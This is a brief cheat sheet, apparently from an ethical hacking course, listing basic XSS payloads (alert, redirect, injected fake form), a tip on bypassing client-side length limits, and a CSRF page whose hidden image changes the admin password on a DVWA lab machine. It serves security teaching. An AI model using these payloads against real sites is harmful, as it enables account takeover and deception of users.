# EHD Web Application Cheat Sheet

###### tags: `EHD`

## XSS
- Trigger alert in textbox input (Type into textbox)
```html
<script>alert("Hello!")</script>
```

- Redirect to another page (Type into textbox)
```html
<script>document.location="https://www.google.com"</script>
```

- If there is a maximum length limit for text input, inspect and modify the input element
![](https://i.imgur.com/e4sSKVf.png)

- Creating a fake form (type into textbox):
```html
<form>
Input1: <input type="text"><br>
Input2: <input type="text"><br>
<input type="submit" value="submit button">
</form>
```

## CSRF
- Create a CSRF page with the following contents:
- Contains link to change credentials
```html
<!--
Comments:
- Replace Win10-IP with own Win10 VM IP Address
- Image source set to URI dusplayed when admin password is changed
-->
This is a very new web page
<img width="1" src="http://Win10-IP/dvwa-master/vulnerabilities/csrf/?password_new=12345678&password_conf=12345678&Change=Change">
```

### 